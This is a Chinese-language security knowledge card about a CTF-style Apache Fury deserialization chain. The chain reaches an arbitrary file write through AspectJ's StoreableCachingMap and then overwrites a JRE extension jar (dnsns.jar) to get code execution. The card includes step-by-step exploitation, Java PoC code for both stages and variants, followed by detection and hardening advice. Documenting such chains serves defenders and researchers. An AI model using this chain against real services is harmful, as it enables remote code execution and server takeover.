---
id: web-java-deser-fury-priorityqueue-aspectj-jre-jar-write-rce
title: Fury 反序列化经 PriorityQueue/TransformingComparator 触发 AspectJ StoreableCachingMap：写 JRE 扩展 jar 加载 RCE
type: scenario
domain: web
path: web/java/deserialization/comparator
technique: fury-priorityqueue-aspectj-storeablecachingmap-jar-write-rce
aliases:
- Apache Fury 反序列化
- Fury requireClassRegistration false
- Fury RCE
- StoreableCachingMap 任意文件写
- aspectjweaver 写文件
- dnsns.jar 加载触发
- ascii jar
- 阿里CTF Fury
tags:
- java
- deserialization
- fury
- priorityqueue
- transformingcomparator
- aspectj
- storeablecachingmap
- arbitrary-file-write
- jre
- jar
- rce
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V157
  verified_at: '2026-11-06T07:39:04+08:00'
  notes: 已对照原文与21张图核对：入口 Fury requireClassRegistration(false) 反序列化 base64、PriorityQueue+TransformingComparator(StringValueTransformer)→TiedMapEntry→LazyMap→StoreableCachingMap.writeToPath 写任意文件、写 jre/lib/ext/dnsns.jar 后反序列化 DNSNameServiceDescriptor 触发加载；disallowed.txt 屏蔽 commons-collections4 而实际用 3.2.2、aspectjweaver 未屏蔽，均与图19/20一致；图11/12 显示 root shell 与 flag。未在本机复跑。
---

## 一句话结论

当应用用 Apache Fury 反序列化不可信数据且关闭类注册（`requireClassRegistration(false)`）时，可构造 `PriorityQueue` + `TransformingComparator(StringValueTransformer)`，在反序列化重建队列时经 `TiedMapEntry.toString → LazyMap.get → AspectJ StoreableCachingMap.put` 把任意字节写到任意路径；再把恶意 jar 写入 JRE 的 `lib/ext`（如 `dnsns.jar`）并反序列化对应描述符类触发类加载，即可从任意文件写升级为命令执行。

## 原理

- **Fury 的类信任边界**：`Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build()` 允许反序列化任意 classpath 内的类。Fury 用自身的 `CollectionSerializer` 还原 `PriorityQueue`，重建过程会调用 `PriorityQueue.add`/`heapify`，从而触发队列 comparator 的 `compare`——这是反序列化阶段而非业务代码主动调用的触发点。
- **Comparator→toString 桥**：`TransformingComparator` 使用 `StringValueTransformer` 时，`compare(a,b)` 会对元素执行 `String.valueOf`，即调用 `toString()`。把元素换成 `TiedMapEntry` 后，`TiedMapEntry.toString()` 会调用 `getValue()` → `map.get(key)`。
- **LazyMap→写入 sink**：`map` 用 `LazyMap.decorate(StoreableCachingMap, ConstantFactory(bytes))` 构造。`LazyMap.get(key)` 未命中时调用 `factory.create(key)` 得到攻击者字节，随后把键值 `put` 回被装饰的 `StoreableCachingMap`；其 `put` 调用 `writeToPath(key, bytes)`，直接 `new FileOutputStream(folder + File.separator + key)` 写入。`key` 完全可控且不做路径规范化，用 `../../../../...` 即可写到 JRE 目录。
- **文件写→RCE**：JDK 8 的 `jre/lib/ext` 由扩展类加载器加载，`jre/lib` 下的 `dnsns.jar`、`jce.jar`、`charsets.jar` 等在首次需要对应类时按需加载。攻击者把含恶意 `sun.net.spi.nameservice.dns.DNSNameServiceDescriptor` 的 jar 覆盖/写到 `jre/lib/ext/dnsns.jar`，再反序列化该类实例；类加载与构造/初始化执行攻击者代码。文中验证了 `dnsns.jar` 尚未加载时可由该描述符类触发加载。
- **为什么链能成立**：题目/Fury 的 `disallowed.txt` 列的是 `org.apache.commons.collections4.comparators.TransformingComparator`，而实际 classpath 是 commons-collections 3.2.2，用的是 `org.apache.commons.collections.comparators.TransformingComparator`，黑名单未覆盖实际类；AspectJ 的 `SimpleCache$StoreableCachingMap` 也不在禁止列表，形成可用 gadget。
- **ASCII jar**：若写入通道限制字节范围，可构造只含可打印 ASCII 的 jar（对 class 做 deflate 后用允许字节集压缩、调整 padding 使 CRC/长度等字段都落在允许字符集），保证恶意 jar 能通过字节白名单原样落盘。

## 触发条件

- 目标使用 Apache Fury 反序列化攻击者可控字节，且 `requireClassRegistration(false)` 或类注册未被强制。
- classpath 中存在 commons-collections 3.2.2（`TransformingComparator`、`StringValueTransformer`、`LazyMap`、`TiedMapEntry`、`ConstantFactory`）与 aspectjweaver（`SimpleCache$StoreableCachingMap`），或等价的可写文件 gadget。
- 目标进程对写入路径有权限；要升级 RCE 还需 JRE 目录（如 `jre/lib/ext`）可写，且目标类尚未加载或可被触发加载。
- 序列化过滤器/黑名单未覆盖实际使用的类名（常见于只按依赖版本清单屏蔽、与实际 classpath 不一致）。

## 利用步骤

1. 确认入口接收 Fury 序列化数据（文中为 Base64 表单字段 `data`，服务端直接 `fury.deserialize`）。
2. 反射构造 `StoreableCachingMap(".", 100)`，用 `LazyMap.decorate` 包装 `ConstantFactory(jarBytes)`，再构造 `TiedMapEntry(lazyMap, "../../../../.../jre/lib/ext/dnsns.jar")`。
3. 用 `TransformingComparator(StringValueTransformer.getInstance())` 构造 `PriorityQueue(2, comparator)`，反射把 `size` 置 2、`queue[0]=queue[1]=entry`。
4. `fury.serialize(queue)` 得到第一阶段 payload，Base64 提交；Fury 反序列化时触发 compare → toString → get → put → 写出恶意 jar。
5. 准备恶意 `dnsns.jar`：修改 `sun.net.spi.nameservice.dns.DNSNameServiceDescriptor` 的构造函数/静态块加入命令执行；必要时用 ascii-jar 生成纯 ASCII 字节 jar。
6. 再提交一个 Fury 序列化的 `DNSNameServiceDescriptor` 实例（反射构造），触发 JRE 从 `jre/lib/ext/dnsns.jar` 加载该类并执行，得到命令执行。

## PoC

以下为最小链构造骨架（按文章 PoC 精简，未在本机复跑）：

```java
byte[] jar = Files.readAllBytes(Paths.get("evildnsns.jar"));
Class<?> sc = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
Map store = (Map) sc.getDeclaredConstructor(String.class, int.class)
        .newInstance(".", 100); // newInstance 前 setAccessible(true)
Map lazy = LazyMap.decorate(store, new ConstantFactory(jar));
TiedMapEntry entry = new TiedMapEntry(lazy,
        "../../../../../../../../../usr/local/openjdk-8/jre/lib/ext/dnsns.jar");

TransformingComparator cmp = new TransformingComparator(StringValueTransformer.getInstance());
PriorityQueue q = new PriorityQueue(2, cmp);
Field size = PriorityQueue.class.getDeclaredField("size"); size.setAccessible(true); size.set(q, 2);
Field queue = PriorityQueue.class.getDeclaredField("queue"); queue.setAccessible(true);
queue.set(q, new Object[]{entry, entry});

Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
String b64 = Base64.getEncoder().encodeToString(fury.serialize(q));
```

```java
// 触发 jar 加载的第二阶段（类来自被替换的 dnsns.jar）
Class<?> d = Class.forName("sun.net.spi.nameservice.dns.DNSNameServiceDescriptor");
Object inst = d.getDeclaredConstructor().newInstance();
byte[] p2 = fury.serialize(inst);
// Base64 提交 p2，JRE 加载 dnsns.jar 中的类并执行其构造函数
```

```python
# ascii-jar 思路：allowed = 0..127 去掉 & < ' > " ( ) 的字节码
# 用允许字节集重新压缩 class，并调整 padding，使 zip 头/CRC/长度字段均在允许范围内
```

## 变体与关联

- 变体：写入位置换成 `jre/lib/jce.jar`（触发 `javax.crypto.NoSuchPaddingException` 类加载）、`jre/lib/charsets.jar`（`Charset.forName`/`Accept: charset=`）、`jre/lib/ext` 下任意新 jar；或写 `jre/classes` + SPI 服务文件。
- 变体：若没有 AspectJ，可换其他“可控 key 的 Map.put 写文件”sink；comparator 触发点也可换成其他会对元素调用 `toString` 的 comparator。
- 变体：Fury 的二次反序列化桥（UsingToStringOrdering → AbstractMemoryDataStore → IOUtils.deserialize）可在第一阶段被过滤器限制时转入第二阶段，见关联卡。
- 关联：[[web-java-deser-commonscollections-cc4-priorityqueue-templatesimpl]]（同类 PriorityQueue+TransformingComparator 触发，sink 为 TemplatesImpl）、[[web-java-classloader-charsets-jar-bootstrap-overwrite-accept-gbk-rce]]（写 JRE jar 后由字符集加载触发）、[[web-java-deser-fastjson-file-write-to-rce]]（任意文件写升级 RCE 的落地点选择）、[[web-java-deser-fury-usingtostring-datastore-ioUtils-secondary-deser]]。
- 边界：`requireClassRegistration(true)`/严格类白名单、classpath 无 aspectjweaver 与 commons-collections、JRE 目录只读、目标 jar 类已被加载且无其他触发点、写入被路径/字节校验拦截时，链不成立。

## 检测与防御

- 反序列化配置：Fury 对不可信输入必须 `requireClassRegistration(true)` 并维护类白名单；不要依赖与真实 classpath 不一致的黑名单（文中黑名单屏蔽 commons-collections4，实际依赖是 3.2.2）。
- 依赖治理：移除不必要的 commons-collections 3.2.2 与 aspectjweaver；无法移除时用 JEP 290 序列化过滤器限制 `PriorityQueue`、`TiedMapEntry`、`LazyMap`、`StoreableCachingMap` 等 gadget 类。
- 运行权限：应用进程不得写 JRE 安装目录；容器根文件系统只读；以低权限用户运行。
- 检测：JRE `lib`/`lib/ext` 目录出现新增或哈希变化的 jar；Java 进程随后派生 `sh`/`bash` 或执行异常命令；序列化入口出现包含 `PriorityQueue`/`TransformingComparator`/`StoreableCachingMap` 的类描述；反序列化后紧接文件写入 JRE 路径的行为。
- 响应：还原被替换的 JRE jar（重装/重建镜像），轮换该主机凭据，审计同一入口的其他序列化请求。
